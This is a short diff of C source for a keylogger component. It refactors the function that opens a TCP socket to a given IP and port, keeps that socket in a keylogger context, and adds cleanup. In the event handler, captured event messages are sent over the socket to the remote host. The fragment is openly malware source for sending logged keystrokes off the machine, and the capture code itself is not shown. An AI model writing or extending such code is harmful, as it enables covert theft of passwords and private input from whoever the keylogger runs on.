@@ -89,7 +89,6 @@ int keylogger_processor_process_event(void *ctx, void *data, size_t data_sz) {
 
     if (keylogger_ctx->keylogger_socket_fd >= 0) {
         ret = send(keylogger_ctx->keylogger_socket_fd, msgbuf, strlen(msgbuf), MSG_NOSIGNAL);
-
         if (ret < 0) {
             close(keylogger_ctx->keylogger_socket_fd);
             keylogger_ctx->keylogger_socket_fd = -1;
@@ -99,7 +98,8 @@ int keylogger_processor_process_event(void *ctx, void *data, size_t data_sz) {
     return 0;
 }
 
-int keylogger_processor_init_sender_socket(const char *ip, int port) {
+int keylogger_processor_init_sender_socket(keylogger_context_t *keylogger_ctx, const char *ip,
+                                           int port) {
     int ret = 0;
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0)
@@ -116,5 +116,16 @@ int keylogger_processor_init_sender_socket(const char *ip, int port) {
         close(sock);
         return ret;
     }
-    return sock;
+    keylogger_ctx->keylogger_socket_fd = sock;
+    return 0;
+}
+
+void keylogger_processor_cleanup(keylogger_context_t *keylogger_ctx) {
+    if (!keylogger_ctx)
+        return;
+
+    if (keylogger_ctx->keylogger_socket_fd >= 0) {
+        close(keylogger_ctx->keylogger_socket_fd);
+        keylogger_ctx->keylogger_socket_fd = -1;
+    }
 }
